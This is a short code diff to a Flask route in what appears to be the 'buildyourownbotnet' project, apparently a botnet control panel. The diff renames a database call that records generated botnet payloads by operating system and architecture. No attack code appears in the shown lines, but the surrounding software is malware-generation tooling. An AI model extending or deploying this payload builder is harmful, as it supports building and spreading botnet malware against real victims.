@@ -3,7 +3,7 @@ import subprocess
 from flask import Blueprint, request, redirect, url_for, flash
 from flask_login import login_user, logout_user, current_user, login_required
 from buildyourownbotnet import client
-from buildyourownbotnet.core import dao
+from buildyourownbotnet.core.dao import payload_dao
 
 # Blueprint
 payload = Blueprint('payload', __name__)
@@ -57,7 +57,7 @@ def payload_generate():
 		architecture = None if 'py' in payload_format else architecture
 
 		# add payload to database
-		dao.add_payload(current_user.id, os.path.basename(outfile), operating_system, architecture)
+		payload_dao.add_user_payload(current_user.id, os.path.basename(outfile), operating_system, architecture)
 		flash('Successfully generated payload: ' + os.path.basename(outfile), 'success')
 	except Exception as e:
 		flash('Error: compilation timed out or failed. Please go to the Discord support server for help.')
